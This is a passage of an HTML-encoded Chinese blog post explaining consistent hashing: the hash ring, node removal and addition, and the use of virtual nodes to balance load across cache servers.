id=\"&#x628A;&#x6570;&#x636E;&#x901A;&#x8FC7;&#x4E00;&#x5B9A;&#x7684;hash&#x7B97;&#x6CD5;&#x5904;&#x7406;&#x540E;&#x6620;&#x5C04;&#x5230;&#x73AF;&#x4E0A;\"><a href=\"#&#x628A;&#x6570;&#x636E;&#x901A;&#x8FC7;&#x4E00;&#x5B9A;&#x7684;hash&#x7B97;&#x6CD5;&#x5904;&#x7406;&#x540E;&#x6620;&#x5C04;&#x5230;&#x73AF;&#x4E0A;\" class=\"headerlink\" title=\"&#x628A;&#x6570;&#x636E;&#x901A;&#x8FC7;&#x4E00;&#x5B9A;&#x7684;hash&#x7B97;&#x6CD5;&#x5904;&#x7406;&#x540E;&#x6620;&#x5C04;&#x5230;&#x73AF;&#x4E0A;\"></a>&#x628A;&#x6570;&#x636E;&#x901A;&#x8FC7;&#x4E00;&#x5B9A;&#x7684;hash&#x7B97;&#x6CD5;&#x5904;&#x7406;&#x540E;&#x6620;&#x5C04;&#x5230;&#x73AF;&#x4E0A;</h3><p>&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x5C06;object1&#x3001;object2&#x3001;object3&#x3001;object4&#x56DB;&#x4E2A;&#x5BF9;&#x8C61;&#x901A;&#x8FC7;&#x7279;&#x5B9A;&#x7684;Hash&#x51FD;&#x6570;&#x8BA1;&#x7B97;&#x51FA;&#x5BF9;&#x5E94;&#x7684;key&#x503C;&#xFF0C;&#x7136;&#x540E;&#x6563;&#x5217;&#x5230;Hash&#x73AF;&#x4E0A;&#x3002;&#x5982;&#x4E0B;&#x56FE;&#xFF1A;<br>Hash(object1) = key1&#xFF1B;<br>Hash(object2) = key2&#xFF1B;<br>Hash(object3) = key3&#xFF1B;<br>Hash(object4) = key4&#xFF1B;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/2.png\" alt=\"\"></p>\n<h3 id=\"&#x5C06;&#x673A;&#x5668;&#x901A;&#x8FC7;hash&#x7B97;&#x6CD5;&#x6620;&#x5C04;&#x5230;&#x73AF;&#x4E0A;\"><a href=\"#&#x5C06;&#x673A;&#x5668;&#x901A;&#x8FC7;hash&#x7B97;&#x6CD5;&#x6620;&#x5C04;&#x5230;&#x73AF;&#x4E0A;\" class=\"headerlink\" title=\"&#x5C06;&#x673A;&#x5668;&#x901A;&#x8FC7;hash&#x7B97;&#x6CD5;&#x6620;&#x5C04;&#x5230;&#x73AF;&#x4E0A;\"></a>&#x5C06;&#x673A;&#x5668;&#x901A;&#x8FC7;hash&#x7B97;&#x6CD5;&#x6620;&#x5C04;&#x5230;&#x73AF;&#x4E0A;</h3><p>&#x5728;&#x91C7;&#x7528;&#x4E00;&#x81F4;&#x6027;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x96C6;&#x7FA4;&#x4E2D;&#x5C06;&#x65B0;&#x7684;&#x673A;&#x5668;&#x52A0;&#x5165;&#xFF0C;&#x5176;&#x539F;&#x7406;&#x662F;&#x901A;&#x8FC7;&#x4F7F;&#x7528;&#x4E0E;&#x5BF9;&#x8C61;&#x5B58;&#x50A8;&#x4E00;&#x6837;&#x7684;Hash&#x7B97;&#x6CD5;&#x5C06;&#x673A;&#x5668;&#x4E5F;&#x6620;&#x5C04;&#x5230;&#x73AF;&#x4E2D;&#xFF08;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#x5BF9;&#x673A;&#x5668;&#x7684;hash&#x8BA1;&#x7B97;&#x662F;&#x91C7;&#x7528;&#x673A;&#x5668;&#x7684;IP&#x6216;&#x8005;&#x673A;&#x5668;&#x552F;&#x4E00;&#x7684;&#x522B;&#x540D;&#x4F5C;&#x4E3A;&#x8F93;&#x5165;&#x503C;&#xFF09;&#xFF0C;&#x7136;&#x540E;&#x4EE5;&#x987A;&#x65F6;&#x9488;&#x7684;&#x65B9;&#x5411;&#x8BA1;&#x7B97;&#xFF0C;&#x5C06;&#x6240;&#x6709;&#x5BF9;&#x8C61;&#x5B58;&#x50A8;&#x5230;&#x79BB;&#x81EA;&#x5DF1;&#x6700;&#x8FD1;&#x7684;&#x673A;&#x5668;&#x4E2D;&#x3002;<br>&#x5047;&#x8BBE;&#x73B0;&#x5728;&#x6709;NODE1&#xFF0C;NODE2&#xFF0C;NODE3&#x4E09;&#x53F0;&#x673A;&#x5668;&#xFF0C;&#x901A;&#x8FC7;Hash&#x7B97;&#x6CD5;&#x5F97;&#x5230;&#x5BF9;&#x5E94;&#x7684;KEY&#x503C;&#xFF0C;&#x6620;&#x5C04;&#x5230;&#x73AF;&#x4E2D;&#xFF0C;&#x5176;&#x793A;&#x610F;&#x56FE;&#x5982;&#x4E0B;&#xFF1A;<br>Hash(NODE1) = KEY1;<br>Hash(NODE2) = KEY2;<br>Hash(NODE3) = KEY3;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/3.png\" alt=\"\"></p>\n<p>&#x901A;&#x8FC7;&#x4E0A;&#x56FE;&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#x5BF9;&#x8C61;&#x4E0E;&#x673A;&#x5668;&#x5904;&#x4E8E;&#x540C;&#x4E00;&#x54C8;&#x5E0C;&#x7A7A;&#x95F4;&#x4E2D;&#xFF0C;&#x8FD9;&#x6837;&#x6309;&#x987A;&#x65F6;&#x9488;&#x8F6C;&#x52A8;object1&#x5B58;&#x50A8;&#x5230;&#x4E86;NODE1&#x4E2D;&#xFF0C;object3&#x5B58;&#x50A8;&#x5230;&#x4E86;NODE2&#x4E2D;&#xFF0C;object2&#x3001;object4&#x5B58;&#x50A8;&#x5230;&#x4E86;NODE3&#x4E2D;&#x3002;&#x5728;&#x8FD9;&#x6837;&#x7684;&#x90E8;&#x7F72;&#x73AF;&#x5883;&#x4E2D;&#xFF0C;hash&#x73AF;&#x662F;&#x4E0D;&#x4F1A;&#x53D8;&#x66F4;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;&#x901A;&#x8FC7;&#x7B97;&#x51FA;&#x5BF9;&#x8C61;&#x7684;hash&#x503C;&#x5C31;&#x80FD;&#x5FEB;&#x901F;&#x7684;&#x5B9A;&#x4F4D;&#x5230;&#x5BF9;&#x5E94;&#x7684;&#x673A;&#x5668;&#x4E2D;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x80FD;&#x627E;&#x5230;&#x5BF9;&#x8C61;&#x771F;&#x6B63;&#x7684;&#x5B58;&#x50A8;&#x4F4D;&#x7F6E;&#x4E86;&#x3002;</p>\n<h3 id=\"&#x673A;&#x5668;&#x7684;&#x5220;&#x9664;&#x4E0E;&#x6DFB;&#x52A0;\"><a href=\"#&#x673A;&#x5668;&#x7684;&#x5220;&#x9664;&#x4E0E;&#x6DFB;&#x52A0;\" class=\"headerlink\" title=\"&#x673A;&#x5668;&#x7684;&#x5220;&#x9664;&#x4E0E;&#x6DFB;&#x52A0;\"></a>&#x673A;&#x5668;&#x7684;&#x5220;&#x9664;&#x4E0E;&#x6DFB;&#x52A0;</h3><p>&#x666E;&#x901A;hash&#x6C42;&#x4F59;&#x7B97;&#x6CD5;&#x6700;&#x4E3A;&#x4E0D;&#x59A5;&#x7684;&#x5730;&#x65B9;&#x5C31;&#x662F;&#x5728;&#x6709;&#x673A;&#x5668;&#x7684;&#x6DFB;&#x52A0;&#x6216;&#x8005;&#x5220;&#x9664;&#x4E4B;&#x540E;&#x4F1A;&#x7167;&#x6210;&#x5927;&#x91CF;&#x7684;&#x5BF9;&#x8C61;&#x5B58;&#x50A8;&#x4F4D;&#x7F6E;&#x5931;&#x6548;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x5927;&#x5927;&#x7684;&#x4E0D;&#x6EE1;&#x8DB3;&#x5355;&#x8C03;&#x6027;&#x4E86;&#x3002;&#x4E0B;&#x9762;&#x6765;&#x5206;&#x6790;&#x4E00;&#x4E0B;&#x4E00;&#x81F4;&#x6027;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x662F;&#x5982;&#x4F55;&#x5904;&#x7406;&#x7684;&#x3002;</p>\n<ol>\n<li><p>&#x8282;&#x70B9;&#xFF08;&#x673A;&#x5668;&#xFF09;&#x7684;&#x5220;&#x9664;<br>&#x4EE5;&#x4E0A;&#x9762;&#x7684;&#x5206;&#x5E03;&#x4E3A;&#x4F8B;&#xFF0C;&#x5982;&#x679C;NODE2&#x51FA;&#x73B0;&#x6545;&#x969C;&#x88AB;&#x5220;&#x9664;&#x4E86;&#xFF0C;&#x90A3;&#x4E48;&#x6309;&#x7167;&#x987A;&#x65F6;&#x9488;&#x8FC1;&#x79FB;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;object3&#x5C06;&#x4F1A;&#x88AB;&#x8FC1;&#x79FB;&#x5230;NODE3&#x4E2D;&#xFF0C;&#x8FD9;&#x6837;&#x4EC5;&#x4EC5;&#x662F;object3&#x7684;&#x6620;&#x5C04;&#x4F4D;&#x7F6E;&#x53D1;&#x751F;&#x4E86;&#x53D8;&#x5316;&#xFF0C;&#x5176;&#x5B83;&#x7684;&#x5BF9;&#x8C61;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x7684;&#x6539;&#x52A8;&#x3002;&#x5982;&#x4E0B;&#x56FE;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/4.png\" alt=\"\"></p>\n</li>\n<li><p>&#x8282;&#x70B9;&#xFF08;&#x673A;&#x5668;&#xFF09;&#x7684;&#x6DFB;&#x52A0;<br>&#x5982;&#x679C;&#x5F80;&#x96C6;&#x7FA4;&#x4E2D;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x8282;&#x70B9;NODE4&#xFF0C;&#x901A;&#x8FC7;&#x5BF9;&#x5E94;&#x7684;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x5F97;&#x5230;KEY4&#xFF0C;&#x5E76;&#x6620;&#x5C04;&#x5230;&#x73AF;&#x4E2D;&#xFF0C;&#x5982;&#x4E0B;&#x56FE;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/5.png\" alt=\"\"></p>\n</li>\n</ol>\n<p>&#x901A;&#x8FC7;&#x6309;&#x987A;&#x65F6;&#x9488;&#x8FC1;&#x79FB;&#x7684;&#x89C4;&#x5219;&#xFF0C;&#x90A3;&#x4E48;object2&#x88AB;&#x8FC1;&#x79FB;&#x5230;&#x4E86;NODE4&#x4E2D;&#xFF0C;&#x5176;&#x5B83;&#x5BF9;&#x8C61;&#x8FD8;&#x4FDD;&#x6301;&#x8FD9;&#x539F;&#x6709;&#x7684;&#x5B58;&#x50A8;&#x4F4D;&#x7F6E;&#x3002;&#x901A;&#x8FC7;&#x5BF9;&#x8282;&#x70B9;&#x7684;&#x6DFB;&#x52A0;&#x548C;&#x5220;&#x9664;&#x7684;&#x5206;&#x6790;&#xFF0C;&#x4E00;&#x81F4;&#x6027;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x5728;&#x4FDD;&#x6301;&#x4E86;&#x5355;&#x8C03;&#x6027;&#x7684;&#x540C;&#x65F6;&#xFF0C;&#x8FD8;&#x662F;&#x6570;&#x636E;&#x7684;&#x8FC1;&#x79FB;&#x8FBE;&#x5230;&#x4E86;&#x6700;&#x5C0F;&#xFF0C;&#x8FD9;&#x6837;&#x7684;&#x7B97;&#x6CD5;&#x5BF9;&#x5206;&#x5E03;&#x5F0F;&#x96C6;&#x7FA4;&#x6765;&#x8BF4;&#x662F;&#x975E;&#x5E38;&#x5408;&#x9002;&#x7684;&#xFF0C;&#x907F;&#x514D;&#x4E86;&#x5927;&#x91CF;&#x6570;&#x636E;&#x8FC1;&#x79FB;&#xFF0C;&#x51CF;&#x5C0F;&#x4E86;&#x670D;&#x52A1;&#x5668;&#x7684;&#x7684;&#x538B;&#x529B;&#x3002;</p>\n<h3 id=\"&#x5E73;&#x8861;&#x6027;\"><a href=\"#&#x5E73;&#x8861;&#x6027;\" class=\"headerlink\" title=\"&#x5E73;&#x8861;&#x6027;\"></a>&#x5E73;&#x8861;&#x6027;</h3><p>&#x6839;&#x636E;&#x4E0A;&#x9762;&#x7684;&#x56FE;&#x89E3;&#x5206;&#x6790;&#xFF0C;&#x4E00;&#x81F4;&#x6027;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x6EE1;&#x8DB3;&#x4E86;&#x5355;&#x8C03;&#x6027;&#x548C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x7684;&#x7279;&#x6027;&#x4EE5;&#x53CA;&#x4E00;&#x822C;hash&#x7B97;&#x6CD5;&#x7684;&#x5206;&#x6563;&#x6027;&#xFF0C;&#x4F46;&#x8FD9;&#x8FD8;&#x5E76;&#x4E0D;&#x80FD;&#x5F53;&#x505A;&#x5176;&#x88AB;&#x5E7F;&#x6CDB;&#x5E94;&#x7528;&#x7684;&#x539F;&#x7531;&#xFF0C;&#x56E0;&#x4E3A;&#x8FD8;&#x7F3A;&#x5C11;&#x4E86;&#x5E73;&#x8861;&#x6027;&#x3002;&#x4E0B;&#x9762;&#x5C06;&#x5206;&#x6790;&#x4E00;&#x81F4;&#x6027;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x662F;&#x5982;&#x4F55;&#x6EE1;&#x8DB3;&#x5E73;&#x8861;&#x6027;&#x7684;&#x3002;hash&#x7B97;&#x6CD5;&#x662F;&#x4E0D;&#x4FDD;&#x8BC1;&#x5E73;&#x8861;&#x7684;&#xFF0C;&#x5982;&#x4E0A;&#x9762;&#x53EA;&#x90E8;&#x7F72;&#x4E86;NODE1&#x548C;NODE3&#x7684;&#x60C5;&#x51B5;&#xFF08;NODE2&#x88AB;&#x5220;&#x9664;&#x7684;&#x56FE;&#xFF09;&#xFF0C;object1&#x5B58;&#x50A8;&#x5230;&#x4E86;NODE1&#x4E2D;&#xFF0C;&#x800C;object2&#x3001;object3&#x3001;object4&#x90FD;&#x5B58;&#x50A8;&#x5230;&#x4E86;NODE3&#x4E2D;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x7167;&#x6210;&#x4E86;&#x975E;&#x5E38;&#x4E0D;&#x5E73;&#x8861;&#x7684;&#x72B6;&#x6001;&#x3002;<strong>&#x5728;&#x4E00;&#x81F4;&#x6027;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x4E2D;&#xFF0C;&#x4E3A;&#x4E86;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x6EE1;&#x8DB3;&#x5E73;&#x8861;&#x6027;&#xFF0C;&#x5176;&#x5F15;&#x5165;&#x4E86;&#x865A;&#x62DF;&#x8282;&#x70B9;&#x3002;</strong></p>\n<p>&#x201C;&#x865A;&#x62DF;&#x8282;&#x70B9;&#x201D;&#xFF08; virtual node &#xFF09;&#x662F;&#x5B9E;&#x9645;&#x8282;&#x70B9;&#xFF08;&#x673A;&#x5668;&#xFF09;&#x5728; hash &#x7A7A;&#x95F4;&#x7684;&#x590D;&#x5236;&#x54C1;&#xFF08; replica &#xFF09;&#xFF0C;&#x4E00;&#x5B9E;&#x9645;&#x4E2A;&#x8282;&#x70B9;&#xFF08;&#x673A;&#x5668;&#xFF09;&#x5BF9;&#x5E94;&#x4E86;&#x82E5;&#x5E72;&#x4E2A;&#x201C;&#x865A;&#x62DF;&#x8282;&#x70B9;&#x201D;&#xFF0C;&#x8FD9;&#x4E2A;&#x5BF9;&#x5E94;&#x4E2A;&#x6570;&#x4E5F;&#x6210;&#x4E3A;&#x201C;&#x590D;&#x5236;&#x4E2A;&#x6570;&#x201D;&#xFF0C;&#x201C;&#x865A;&#x62DF;&#x8282;&#x70B9;&#x201D;&#x5728; hash &#x7A7A;&#x95F4;&#x4E2D;&#x4EE5;hash&#x503C;&#x6392;&#x5217;&#x3002;</p>\n<p>&#x4EE5;&#x4E0A;&#x9762;&#x53EA;&#x90E8;&#x7F72;&#x4E86;NODE1&#x548C;NODE3&#x7684;&#x60C5;&#x51B5;&#xFF08;NODE2&#x88AB;&#x5220;&#x9664;&#x7684;&#x56FE;&#xFF09;&#x4E3A;&#x4F8B;&#xFF0C;&#x4E4B;&#x524D;&#x7684;&#x5BF9;&#x8C61;&#x5728;&#x673A;&#x5668;&#x4E0A;&#x7684;&#x5206;&#x5E03;&#x5F88;&#x4E0D;&#x5747;&#x8861;&#xFF0C;&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x4EE5;2&#x4E2A;&#x526F;&#x672C;&#xFF08;&#x590D;&#x5236;&#x4E2A;&#x6570;&#xFF09;&#x4E3A;&#x4F8B;&#xFF0C;&#x8FD9;&#x6837;&#x6574;&#x4E2A;hash&#x73AF;&#x4E2D;&#x5C31;&#x5B58;&#x5728;&#x4E86;4&#x4E2A;&#x865A;&#x62DF;&#x8282;&#x70B9;&#xFF0C;&#x6700;&#x540E;&#x5BF9;&#x8C61;&#x6620;&#x5C04;&#x7684;&#x5173;&#x7CFB;&#x56FE;&#x5982;&#x4E0B;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/6.png\" alt=\"\"></p>\n<p>&#x6839;&#x636E;&#x4E0A;&#x56FE;&#x53EF;&#x77E5;&#x5BF9;&#x8C61;&#x7684;&#x6620;&#x5C04;&#x5173;&#x7CFB;&#xFF1A;object1-&gt;NODE1-1&#xFF0C;object2-&gt;NODE1-2&#xFF0C;object3-&gt;NODE3-2&#xFF0C;object4-&gt;NODE3-1&#x3002;&#x901A;&#x8FC7;&#x865A;&#x62DF;&#x8282;&#x70B9;&#x7684;&#x5F15;&#x5165;&#xFF0C;&#x5BF9;&#x8C61;&#x7684;&#x5206;&#x5E03;&#x5C31;&#x6BD4;&#x8F83;&#x5747;&#x8861;&#x4E86;&#x3002;&#x90A3;&#x4E48;&#x5728;&#x5B9E;&#x9645;&#x64CD;&#x4F5C;&#x4E2D;&#xFF0C;&#x6B63;&#x771F;&#x7684;&#x5BF9;&#x8C61;&#x67E5;&#x8BE2;&#x662F;&#x5982;&#x4F55;&#x5DE5;&#x4F5C;&#x7684;&#x5462;&#xFF1F;&#x5BF9;&#x8C61;&#x4ECE;hash&#x5230;&#x865A;&#x62DF;&#x8282;&#x70B9;&#x5230;&#x5B9E;&#x9645;&#x8282;&#x70B9;&#x7684;&#x8F6C;&#x6362;&#x5982;&#x4E0B;&#x56FE;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/7.png\" alt=\"\"></p>\n<p>&#x201C;&#x865A;&#x62DF;&#x8282;&#x70B9;&#x201D;&#x7684;hash&#x8BA1;&#x7B97;&#x53EF;&#x4EE5;&#x91C7;&#x7528;&#x5BF9;&#x5E94;&#x8282;&#x70B9;&#x7684;IP&#x5730;&#x5740;&#x52A0;&#x6570;&#x5B57;&#x540E;&#x7F00;&#x7684;&#x65B9;&#x5F0F;&#x3002;&#x4F8B;&#x5982;&#x5047;&#x8BBE;NODE1&#x7684;IP&#x5730;&#x5740;&#x4E3A;192.168.1.100&#x3002;&#x5F15;&#x5165;&#x201C;&#x865A;&#x62DF;&#x8282;&#x70B9;&#x201D;&#x524D;&#xFF0C;&#x8BA1;&#x7B97; cache A &#x7684; hash &#x503C;&#xFF1A;<br>Hash(&#x201C;192.168.1.100&#x201D;);<br>&#x5F15;&#x5165;&#x201C;&#x865A;&#x62DF;&#x8282;&#x70B9;&#x201D;&#x540E;&#xFF0C;&#x8BA1;&#x7B97;&#x201C;&#x865A;&#x62DF;&#x8282;&#x201D;&#x70B9;NODE1-1&#x548C;NODE1-2&#x7684;hash&#x503C;&#xFF1A;<br>Hash(&#x201C;192.168.1.100#1&#x201D;); // NODE1-1<br>Hash(&#x201C;192.168.1.100#2&#x201D;); // NODE1-2</p>\n<hr>\n<h3 id=\"&#x603B;&#x7ED3;\"><a href=\"#&#x603B;&#x7ED3;\" class=\"headerlink\" title=\"&#x603B;&#x7ED3;\"></a>&#x603B;&#x7ED3;</h3><p>&#x76EE;&#x524D;&#x4E00;&#x81F4;&#x6027;&#x54C8;&#x5E0C;&#x57FA;&#x672C;&#x6210;&#x4E3A;&#x4E86;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x7EC4;&#x4EF6;&#x7684;&#x6807;&#x51C6;&#x914D;&#x7F6E;&#xFF0C;&#x4F8B;&#x5982;Memcached&#x7684;&#x5404;&#x79CD;&#x5BA2;&#x6237;&#x7AEF;&#x90FD;&#x63D0;&#x4F9B;&#x5185;&#x7F6E;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x54C8;&#x5E0C;&#x652F;&#x6301;&#x3002;&#x672C;&#x6587;&#x53EA;&#x662F;&#x7B80;&#x8981;&#x4ECB;&#x7ECD;&#x4E86;&#x8FD9;&#x4E2A;&#x7B97;&#x6CD5;&#xFF0C;&#x66F4;&#x6DF1;&#x5165;&#x7684;&#x5185;&#x5BB9;&#x53EF;&#x4EE5;&#x53C2;&#x770B;&#x8BBA;&#x6587;&#x300A;<a href=\"http://www.akamai.com/dl/technical_publications/ConsistenHashingandRandomTreesDistributedCachingprotocolsforrelievingHotSpotsontheworldwideweb.pdf\" target=\"_blank\" rel=\"external\">Consistent Hashing and Random Trees: Distributed Caching Protocols for Relieving Hot Spots on the World Wide Web</a>&#x300B;&#xFF0C;&#x540C;&#x65F6;&#x63D0;&#x4F9B;&#x4E00;&#x4E2A;<a href=\"http://www.codeproject.com/KB/recipes/lib-conhash.aspx\" target=\"_blank\" rel=\"external\">C&#x8BED;&#x8A00;&#x7248;&#x672C;</a>&#x7684;&#x5B9E;&#x73B0;&#x4F9B;&#x53C2;&#x8003;&#x3002;</p>\n","excerpt":"<h3 id=\"&#x5206;&#x5E03;&#x5F0F;&#x7B97;&#x6CD5;\"><a href=\"#&#x5206;&#x5E03;&#x5F0F;&#x7B97;&#x6CD5;\" class=\"headerlink\" title=\"&#x5206;&#x5E03;&#x5F0F;&#x7B97;&#x6CD5;\"></a>&#x5206;&#x5E03;&#x5F0F;&#x7B97;&#x6CD5;</h3><p><strong>&#x5728;&#x505A;&#x670D;&#x52A1;&#x5668;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x65F6;&#x5019;&#x53EF;&#x4F9B;&#x9009;&#x62E9;&#x7684;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x7684;&#x7B97;&#x6CD5;&#x6709;&#x5F88;&#x591A;&#xFF0C;&#x5305;&#x62EC;&#xFF1A; &#x8F6E;&#x5FAA;&#x7B97;&#x6CD5;(Round Robin)&#x3001;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;(HASH)&#x3001;&#x6700;&#x5C11;&#x8FDE;&#x63A5;&#x7B97;&#x6CD5;(Least Connection)&#x3001;&#x54CD;&#x5E94;&#x901F;&#x5EA6;&#x7B97;&#x6CD5;(Response Time)&#x3001;&#x52A0;&#x6743;&#x6CD5;(Weighted )&#x7B49;&#x3002;&#x5176;&#x4E2D;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x662F;&#x6700;&#x4E3A;&#x5E38;&#x7528;&#x7684;&#x7B97;&#x6CD5;.</strong></p>\n<p>&#x5178;&#x578B;&#x7684;&#x5E94;&#x7528;&#x573A;&#x666F;&#x662F;&#xFF1A; &#x6709;N&#x53F0;&#x670D;&#x52A1;&#x5668;&#x63D0;&#x4F9B;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#xFF0C;&#x9700;&#x8981;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x884C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#xFF0C;&#x5C06;&#x8BF7;&#x6C42;&#x5E73;&#x5747;&#x5206;&#x53D1;&#x5230;&#x6BCF;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;&#x6BCF;&#x53F0;&#x673A;&#x5668;&#x8D1F;&#x8D23;1/N&#x7684;&#x670D;&#x52A1;&#x3002;</p>\n<p>&#x5E38;&#x7528;&#x7684;&#x7B97;&#x6CD5;&#x662F;&#x5BF9;hash&#x7ED3;&#x679C;&#x53D6;&#x4F59;&#x6570; (hash() mod N )&#xFF1A;&#x5BF9;&#x673A;&#x5668;&#x7F16;&#x53F7;&#x4ECE;0&#x5230;N-1&#xFF0C;&#x6309;&#x7167;&#x81EA;&#x5B9A;&#x4E49;&#x7684; hash()&#x7B97;&#x6CD5;&#xFF0C;&#x5BF9;&#x6BCF;&#x4E2A;&#x8BF7;&#x6C42;&#x7684;hash()&#x503C;&#x6309;N&#x53D6;&#x6A21;&#xFF0C;&#x5F97;&#x5230;&#x4F59;&#x6570;i&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x8BF7;&#x6C42;&#x5206;&#x53D1;&#x5230;&#x7F16;&#x53F7;&#x4E3A;i&#x7684;&#x673A;&#x5668;&#x3002;&#x4F46;&#x8FD9;&#x6837;&#x7684;&#x7B97;&#x6CD5;&#x65B9;&#x6CD5;&#x5B58;&#x5728;&#x81F4;&#x547D;&#x95EE;&#x9898;&#xFF0C;&#x5982;&#x679C;&#x67D0;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x5B95;&#x673A;&#xFF0C;&#x90A3;&#x4E48;&#x5E94;&#x8BE5;&#x843D;&#x5728;&#x8BE5;&#x673A;&#x5668;&#x7684;&#x8BF7;&#x6C42;&#x5C31;&#x65E0;&#x6CD5;&#x5F97;&#x5230;&#x6B63;&#x786E;&#x7684;&#x5904;&#x7406;&#xFF0C;&#x8FD9;&#x65F6;&#x9700;&#x8981;&#x5C06;&#x5F53;&#x6389;&#x7684;&#x670D;&#x52A1;&#x5668;&#x4ECE;&#x7B97;&#x6CD5;&#x4ECE;&#x53BB;&#x9664;&#xFF0C;&#x6B64;&#x65F6;&#x5019;&#x4F1A;&#x6709;(N-1)/N&#x7684;&#x670D;&#x52A1;&#x5668;&#x7684;&#x7F13;&#x5B58;&#x6570;&#x636E;&#x9700;&#x8981;&#x91CD;&#x65B0;&#x8FDB;&#x884C;&#x8BA1;&#x7B97;;&#x5982;&#x679C;&#x65B0;&#x589E;&#x4E00;&#x53F0;&#x673A;&#x5668;&#xFF0C;&#x4F1A;&#x6709;N /(N+1)&#x7684;&#x670D;&#x52A1;&#x5668;&#x7684;&#x7F13;&#x5B58;&#x6570;&#x636E;&#x9700;&#x8981;&#x8FDB;&#x884C;&#x91CD;&#x65B0;&#x8BA1;&#x7B97;&#x3002;&#x5BF9;&#x4E8E;&#x7CFB;&#x7EDF;&#x800C;&#x8A00;&#xFF0C;&#x8FD9;&#x901A;&#x5E38;&#x662F;&#x4E0D;&#x53EF;&#x63A5;&#x53D7;&#x7684;&#x98A0;&#x7C38;(&#x56E0;&#x4E3A;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x5927;&#x91CF;&#x7F13;&#x5B58;&#x7684;&#x5931;&#x6548;&#x6216;&#x8005;&#x6570;&#x636E;&#x9700;&#x8981;&#x8F6C;&#x79FB;)&#x3002;&#x90A3;&#x4E48;&#xFF0C;&#x5982;&#x4F55;&#x8BBE;&#x8BA1;&#x4E00;&#x4E2A;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x7B56;&#x7565;&#xFF0C;&#x4F7F;&#x5F97;&#x53D7;&#x5230;&#x5F71;&#x54CD;&#x7684;&#x8BF7;&#x6C42;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x5C11;&#x5462;?</p>\n<p><strong><em>&#x5728;Memcached&#x3001;Key-Value Store &#x3001;Bittorrent DHT&#x3001;LVS&#x4E2D;&#x90FD;&#x91C7;&#x7528;&#x4E86;Consistent Hashing&#x7B97;&#x6CD5;&#xFF0C;&#x53EF;&#x4EE5;&#x8BF4;Consistent Hashing &#x662F;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x7684;&#x9996;&#x9009;&#x7B97;&#x6CD5;&#x3002;</em></strong></p>","more":"<hr>\n<h3 id=\"&#x4E00;&#x81F4;&#x54C8;&#x5E0C;\"><a href=\"#&#x4E00;&#x81F4;&#x54C8;&#x5E0C;\" class=\"headerlink\" title=\"&#x4E00;&#x81F4;&#x54C8;&#x5E0C;\"></a>&#x4E00;&#x81F4;&#x54C8;&#x5E0C;</h3><p>&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x662F;&#x4E00;&#x79CD;&#x7279;&#x6B8A;&#x7684;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x3002;&#x5728;&#x4F7F;&#x7528;&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x540E;&#xFF0C;&#x54C8;&#x5E0C;&#x8868;&#x69FD;&#x4F4D;&#x6570;&#xFF08;&#x5927;&#x5C0F;&#xFF09;&#x7684;&#x6539;&#x53D8;&#x5E73;&#x5747;&#x53EA;&#x9700;&#x8981;&#x5BF9; K/n &#x4E2A;&#x5173;&#x952E;&#x5B57;&#x91CD;&#x65B0;&#x6620;&#x5C04;&#xFF0C;&#x5176;&#x4E2D; 